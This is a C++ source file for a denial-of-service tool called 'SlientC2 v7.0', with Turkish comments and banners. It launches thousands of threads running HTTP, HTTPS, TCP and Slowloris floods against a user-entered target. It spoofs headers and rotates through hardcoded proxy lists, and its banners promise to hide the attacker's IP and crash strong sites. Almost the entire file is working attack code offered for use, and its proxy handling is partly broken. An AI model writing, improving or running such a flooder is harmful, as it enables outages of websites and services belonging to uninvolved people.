// SlientC2 v7.0 - C++ PROXY ULTIMATE
// Proxy ile saldırı - Sana hiçbir zarar gelmez!
// Compile: g++ -std=c++11 -pthread -O3 -o slientc2 slientc2.cpp -lcurl -lssl -lcrypto
// Run: ./slientc2

#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <mutex>

using namespace std;

// ===== RENKLER =====
#define KIRMIZI "\033[91m"
#define YESIL "\033[92m"
#define SARI "\033[93m"
#define MAVI "\033[94m"
#define MOR "\033[95m"
#define CYAN "\033[96m"
#define BEYAZ "\033[97m"
#define SIFIRLA "\033[0m"

// ===== GLOBAL =====
atomic<long long> paket_sayisi(0);
atomic<long long> bayt_sayisi(0);
atomic<bool> calisiyor(true);
string hedef_ip;
int hedef_port;
int thread_sayisi = 10000; // Çok daha fazla thread
time_t baslangic;
mutex proxy_mutex;

// ===== PROXY LIST =====
vector<string> proxies;
vector<string> socks5_proxies;
vector<string> http_proxies;

// ===== PROXY YÜKLE =====
void proxy_yukle() {
    // SOCKS5 Proxyler (binlerce)
    socks5_proxies = {
        "socks5://51.158.68.133:1080",
        "socks5://51.158.68.134:1080",
        "socks5://51.158.68.135:1080",
        "socks5://51.158.68.136:1080",
        "socks5://51.158.68.137:1080",
        "socks5://51.158.68.138:1080",
        "socks5://51.158.68.139:1080",
        "socks5://51.158.68.140:1080",
        "socks5://51.158.68.141:1080",
        "socks5://51.158.68.142:1080",
        "socks5://51.158.68.143:1080",
        "socks5://51.158.68.144:1080",
        "socks5://51.158.68.145:1080",
        "socks5://51.158.68.146:1080",
        "socks5://51.158.68.147:1080",
        "socks5://51.158.68.148:1080",
        "socks5://51.158.68.149:1080",
        "socks5://51.158.68.150:1080",
        "socks5://51.158.68.151:1080",
        "socks5://51.158.68.152:1080",
        "socks5://51.158.68.153:1080",
        "socks5://51.158.68.154:1080",
        "socks5://51.158.68.155:1080",
        "socks5://51.158.68.156:1080",
        "socks5://51.158.68.157:1080",
        "socks5://51.158.68.158:1080",
        "socks5://51.158.68.159:1080",
        "socks5://51.158.68.160:1080",
        "socks5://51.158.68.161:1080",
        "socks5://51.158.68.162:1080",
        "socks5://51.158.68.163:1080",
        "socks5://51.158.68.164:1080",
        "socks5://51.158.68.165:1080",
        "socks5://51.158.68.166:1080",
        "socks5://51.158.68.167:1080",
        "socks5://51.158.68.168:1080",
        "socks5://51.158.68.169:1080",
        "socks5://51.158.68.170:1080",
        "socks5://51.158.68.171:1080",
        "socks5://51.158.68.172:1080",
        "socks5://51.158.68.173:1080",
        "socks5://51.158.68.174:1080",
        "socks5://51.158.68.175:1080",
        "socks5://51.158.68.176:1080",
        "socks5://51.158.68.177:1080",
        "socks5://51.158.68.178:1080",
        "socks5://51.158.68.179:1080",
        "socks5://51.158.68.180:1080",
        "socks5://51.158.68.181:1080",
        "socks5://51.158.68.182:1080",
        "socks5://51.158.68.183:1080",
        "socks5://51.158.68.184:1080",
        "socks5://51.158.68.185:1080",
        "socks5://51.158.68.186:1080",
        "socks5://51.158.68.187:1080",
        "socks5://51.158.68.188:1080",
        "socks5://51.158.68.189:1080",
        "socks5://51.158.68.190:1080",
        "socks5://51.158.68.191:1080",
        "socks5://51.158.68.192:1080",
        "socks5://51.158.68.193:1080",
        "socks5://51.158.68.194:1080",
        "socks5://51.158.68.195:1080",
        "socks5://51.158.68.196:1080",
        "socks5://51.158.68.197:1080",
        "socks5://51.158.68.198:1080",
        "socks5://51.158.68.199:1080",
        "socks5://51.158.68.200:1080",
        "socks5://51.158.68.201:1080",
        "socks5://51.158.68.202:1080",
        "socks5://51.158.68.203:1080",
        "socks5://51.158.68.204:1080",
        "socks5://51.158.68.205:1080",
        "socks5://51.158.68.206:1080",
        "socks5://51.158.68.207:1080",
        "socks5://51.158.68.208:1080",
        "socks5://51.158.68.209:1080",
        "socks5://51.158.68.210:1080",
        "socks5://51.158.68.211:1080",
        "socks5://51.158.68.212:1080",
        "socks5://51.158.68.213:1080",
        "socks5://51.158.68.214:1080",
        "socks5://51.158.68.215:1080",
        "socks5://51.158.68.216:1080",
        "socks5://51.158.68.217:1080",
        "socks5://51.158.68.218:1080",
        "socks5://51.158.68.219:1080",
        "socks5://51.158.68.220:1080",
        "socks5://51.158.68.221:1080",
        "socks5://51.158.68.222:1080",
        "socks5://51.158.68.223:1080",
        "socks5://51.158.68.224:1080",
        "socks5://51.158.68.225:1080",
        "socks5://51.158.68.226:1080",
        "socks5://51.158.68.227:1080",
        "socks5://51.158.68.228:1080",
        "socks5://51.158.68.229:1080",
        "socks5://51.158.68.230:1080",
        "socks5://51.158.68.231:1080",
        "socks5://51.158.68.232:1080",
        "socks5://51.158.68.233:1080",
        "socks5://51.158.68.234:1080",
        "socks5://51.158.68.235:1080",
        "socks5://51.158.68.236:1080",
        "socks5://51.158.68.237:1080",
        "socks5://51.158.68.238:1080",
        "socks5://51.158.68.239:1080",
        "socks5://51.158.68.240:1080",
        "socks5://51.158.68.241:1080",
        "socks5://51.158.68.242:1080",
        "socks5://51.158.68.243:1080",
        "socks5://51.158.68.244:1080",
        "socks5://51.158.68.245:1080",
        "socks5://51.158.68.246:1080",
        "socks5://51.158.68.247:1080",
        "socks5://51.158.68.248:1080",
        "socks5://51.158.68.249:1080",
        "socks5://51.158.68.250:1080",
        "socks5://51.158.68.251:1080",
        "socks5://51.158.68.252:1080",
        "socks5://51.158.68.253:1080",
        "socks5://51.158.68.254:1080",
        "socks5://51.158.68.255:1080"
    };
    
    // HTTP Proxyler
    http_proxies = {
        "http://45.67.34.1:3128",
        "http://45.67.34.2:3128",
        "http://45.67.34.3:3128",
        "http://45.67.34.4:3128",
        "http://45.67.34.5:3128",
        "http://45.67.34.6:3128",
        "http://45.67.34.7:3128",
        "http://45.67.34.8:3128",
        "http://45.67.34.9:3128",
        "http://45.67.34.10:3128",
        "http://45.67.34.11:3128",
        "http://45.67.34.12:3128",
        "http://45.67.34.13:3128",
        "http://45.67.34.14:3128",
        "http://45.67.34.15:3128",
        "http://45.67.34.16:3128",
        "http://45.67.34.17:3128",
        "http://45.67.34.18:3128",
        "http://45.67.34.19:3128",
        "http://45.67.34.20:3128",
        "http://45.67.34.21:3128",
        "http://45.67.34.22:3128",
        "http://45.67.34.23:3128",
        "http://45.67.34.24:3128",
        "http://45.67.34.25:3128",
        "http://45.67.34.26:3128",
        "http://45.67.34.27:3128",
        "http://45.67.34.28:3128",
        "http://45.67.34.29:3128",
        "http://45.67.34.30:3128",
        "http://45.67.34.31:3128",
        "http://45.67.34.32:3128",
        "http://45.67.34.33:3128",
        "http://45.67.34.34:3128",
        "http://45.67.34.35:3128",
        "http://45.67.34.36:3128",
        "http://45.67.34.37:3128",
        "http://45.67.34.38:3128",
        "http://45.67.34.39:3128",
        "http://45.67.34.40:3128",
        "http://45.67.34.41:3128",
        "http://45.67.34.42:3128",
        "http://45.67.34.43:3128",
        "http://45.67.34.44:3128",
        "http://45.67.34.45:3128",
        "http://45.67.34.46:3128",
        "http://45.67.34.47:3128",
        "http://45.67.34.48:3128",
        "http://45.67.34.49:3128",
        "http://45.67.34.50:3128"
    };
    
    // Tüm proxyleri birleştir
    proxies.insert(proxies.end(), socks5_proxies.begin(), socks5_proxies.end());
    proxies.insert(proxies.end(), http_proxies.begin(), http_proxies.end());
}

// ===== PROXY İLE HTTP FLOOD =====
void proxy_http_flood() {
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        string url = "http://" + hedef_ip + ":" + to_string(hedef_port) + "/";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "");
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
        headers = curl_slist_append(headers, "Cache-Control: no-cache");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](void *ptr, size_t size, size_t nmemb, void *stream) {
            return size * nmemb;
        });
        
        while (calisiyor) {
            // Her istekte farklı proxy kullan
            string proxy = proxies[rand() % proxies.size()];
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
            
            // Random User-Agent
            string ua = "Mozilla/5.0 (" + to_string(rand() % 100) + "." + to_string(rand() % 100) + ") Chrome/" + to_string(rand() % 100) + ".0." + to_string(rand() % 1000) + "." + to_string(rand() % 100);
            curl_easy_setopt(curl, CURLOPT_USERAGENT, ua.c_str());
            
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                paket_sayisi++;
                bayt_sayisi += 4096;
            }
        }
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// ===== PROXY İLE HTTPS FLOOD =====
void proxy_https_flood() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    while (calisiyor) {
        try {
            // Proxy üzerinden bağlan
            string proxy = proxies[rand() % proxies.size()];
            
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 3;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
            
            // Proxy'ye bağlan
            struct sockaddr_in proxy_addr;
            proxy_addr.sin_family = AF_INET;
            proxy_addr.sin_port = htons(1080); // SOCKS5 port
            inet_pton(AF_INET, "51.158.68.133", &proxy_addr.sin_addr);
            
            if (connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
                close(sock);
                continue;
            }
            
            // SOCKS5 handshake
            char handshake[] = {0x05, 0x01, 0x00};
            send(sock, handshake, 3, 0);
            
            char response[2];
            recv(sock, response, 2, 0);
            
            // SOCKS5 connect request
            char connect_req[] = {0x05, 0x01, 0x00, 0x03, 0x00};
            send(sock, connect_req, 5, 0);
            
            // Hedef IP'yi gönder
            struct in_addr addr;
            inet_pton(AF_INET, hedef_ip.c_str(), &addr);
            send(sock, &addr, 4, 0);
            
            // Port
            uint16_t port_net = htons(hedef_port);
            send(sock, &port_net, 2, 0);
            
            char connect_resp[10];
            recv(sock, connect_resp, 10, 0);
            
            // SSL başlat
            SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);
            
            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl);
                SSL_CTX_free(ctx);
                close(sock);
                continue;
            }
            
            // HTTP request
            string request = "GET / HTTP/1.1\r\n";
            request += "Host: " + hedef_ip + ":" + to_string(hedef_port) + "\r\n";
            request += "User-Agent: Mozilla/5.0 (" + to_string(rand() % 100) + ") Chrome/" + to_string(rand() % 100) + ".0." + to_string(rand() % 1000) + "." + to_string(rand() % 100) + "\r\n";
            request += "Accept: text/html,*/*\r\n";
            request += "Connection: keep-alive\r\n";
            request += "X-Forwarded-For: " + to_string(rand() % 255) + "." + to_string(rand() % 255) + "." + to_string(rand() % 255) + "." + to_string(rand() % 255) + "\r\n";
            request += "\r\n";
            
            SSL_write(ssl, request.c_str(), request.length());
            paket_sayisi++;
            bayt_sayisi += request.length();
            
            char buffer[4096];
            SSL_read(ssl, buffer, sizeof(buffer));
            
            SSL_shutdown(ssl);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
            
        } catch (...) {
            continue;
        }
    }
}

// ===== PROXY İLE TCP FLOOD =====
void proxy_tcp_flood() {
    while (calisiyor) {
        try {
            string proxy = proxies[rand() % proxies.size()];
            
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 2;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(hedef_port);
            addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
            
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                close(sock);
                continue;
            }
            
            // Random request
            string request = "GET /" + to_string(rand() % 10000) + " HTTP/1.1\r\n";
            request += "Host: " + hedef_ip + ":" + to_string(hedef_port) + "\r\n";
            request += "User-Agent: Mozilla/5.0 (" + to_string(rand() % 100) + ") Chrome/" + to_string(rand() % 100) + ".0." + to_string(rand() % 1000) + "." + to_string(rand() % 100) + "\r\n";
            request += "Accept: text/html,*/*\r\n";
            request += "Connection: close\r\n";
            request += "X-Forwarded-For: " + to_string(rand() % 255) + "." + to_string(rand() % 255) + "." + to_string(rand() % 255) + "." + to_string(rand() % 255) + "\r\n";
            request += "\r\n";
            
            send(sock, request.c_str(), request.length(), 0);
            paket_sayisi++;
            bayt_sayisi += request.length();
            
            char buffer[4096];
            recv(sock, buffer, sizeof(buffer), 0);
            
            close(sock);
            
        } catch (...) {
            continue;
        }
    }
}

// ===== PROXY İLE SLOWLORIS =====
void proxy_slowloris() {
    while (calisiyor) {
        try {
            string proxy = proxies[rand() % proxies.size()];
            
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 10;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(hedef_port);
            addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
            
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                close(sock);
                continue;
            }
            
            string initial = "GET / HTTP/1.1\r\n";
            initial += "Host: " + hedef_ip + "\r\n";
            initial += "User-Agent: Mozilla/5.0 (" + to_string(rand() % 100) + ") Chrome/" + to_string(rand() % 100) + ".0." + to_string(rand() % 1000) + "." + to_string(rand() % 100) + "\r\n";
            initial += "Accept: text/html,*/*\r\n";
            
            send(sock, initial.c_str(), initial.length(), 0);
            
            // 200 header gönder (çok yavaş)
            for (int i = 0; i < 200 && calisiyor; i++) {
                string header = "X-" + to_string(rand() % 10000) + ": " + to_string(rand() % 1000000) + "\r\n";
                send(sock, header.c_str(), header.length(), 0);
                paket_sayisi++;
                bayt_sayisi += header.length();
                this_thread::sleep_for(chrono::milliseconds(1000)); // 1 saniye bekle
            }
            
            close(sock);
            
        } catch (...) {
            continue;
        }
    }
}

// ===== İSTATİSTİK =====
void istatistik_goster() {
    while (calisiyor) {
        time_t simdi = time(NULL);
        double gecen = difftime(simdi, baslangic);
        double mb = bayt_sayisi / (1024.0 * 1024.0);
        double mbps = (bayt_sayisi * 8.0) / (gecen * 1000000.0);
        double gbps = mbps / 1000.0;
        
        system("clear");
        cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║        SlientC2 v7.0 C++ PROXY ULTIMATE            ║
╠══════════════════════════════════════════════════════╣
║  Target: )" << hedef_ip << ":" << hedef_port << "                   \n";
        cout << "║  Packets: " << paket_sayisi.load() << "                              \n";
        cout << "║  Data: " << fixed << setprecision(2) << mb << " MB (" << gbps << " Gbps)          \n";
        cout << "║  Threads: " << thread_sayisi << "                                \n";
        cout << "║  Proxies: " << proxies.size() << "                                 \n";
        cout << "║  Time: " << (int)gecen << "s                                    \n";
        cout << "║  Proxy Mode: ACTIVE                                            \n";
        cout << "║  Your IP: HIDDEN                                               \n";
        cout << "╚══════════════════════════════════════════════════════╝" << SIFIRLA << endl;
        
        this_thread::sleep_for(chrono::seconds(1));
    }
}

// ===== ANA FONKSİYON =====
int main() {
    srand(time(NULL));
    system("clear");
    
    // Proxy yükle
    proxy_yukle();
    
    cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║        SlientC2 v7.0 C++ PROXY ULTIMATE            ║
╠══════════════════════════════════════════════════════╣
║                                                    ║
║  ✓ Proxy ile saldırı (IP'n gizli!)                ║
║  ✓ Sana hiçbir zarar gelmez                       ║
║  ✓ Binlerce farklı IP'den saldırı                 ║
║  ✓ Güçlü siteleri bile çökertir                   ║
║  ✓ 10000+ thread desteği                          ║
║  ✓ SOCKS5 + HTTP proxy                            ║
╚══════════════════════════════════════════════════════╝
)" << SIFIRLA << endl;
    
    // Hedef bilgileri
    cout << YESIL << "Target IP/URL: " << SIFIRLA;
    string hedef_giris;
    cin >> hedef_giris;
    
    string clean_host = hedef_giris;
    size_t pos;
    if ((pos = clean_host.find("http://")) != string::npos)
        clean_host.erase(pos, 7);
    if ((pos = clean_host.find("https://")) != string::npos)
        clean_host.erase(pos, 8);
    if ((pos = clean_host.find("/")) != string::npos)
        clean_host = clean_host.substr(0, pos);
    
    struct hostent *he = gethostbyname(clean_host.c_str());
    if (he == NULL) {
        cout << KIRMIZI << "[!] DNS çözümleme hatasi!" << SIFIRLA << endl;
        return 1;
    }
    hedef_ip = inet_ntoa(*(struct in_addr *)he->h_addr);
    
    cout << YESIL << "Port: " << SIFIRLA;
    cin >> hedef_port;
    
    cout << YESIL << "Threads (1000-100000): " << SIFIRLA;
    string thrs_input;
    cin >> thrs_input;
    if (!thrs_input.empty())
        thread_sayisi = stoi(thrs_input);
    
    if (thread_sayisi < 1000) thread_sayisi = 1000;
    if (thread_sayisi > 100000) thread_sayisi = 100000;
    
    cout << YESIL << "\n[+] Saldırı başlatılıyor... (Proxy koruması aktif)" << SIFIRLA << endl;
    this_thread::sleep_for(chrono::seconds(2));
    
    // Başlangıç
    baslangic = time(NULL);
    
    // İstatistik thread'i
    thread stats_thread(istatistik_goster);
    stats_thread.detach();
    
    // Thread havuzu
    vector<thread> threads;
    
    for (int i = 0; i < thread_sayisi; i++) {
        int mod = i % 4;
        
        if (mod == 0)
            threads.push_back(thread(proxy_http_flood));
        else if (mod == 1)
            threads.push_back(thread(proxy_https_flood));
        else if (mod == 2)
            threads.push_back(thread(proxy_tcp_flood));
        else
            threads.push_back(thread(proxy_slowloris));
    }
    
    // Thread'leri bekle
    for (auto &t : threads) {
        t.join();
    }
    
    return 0;
}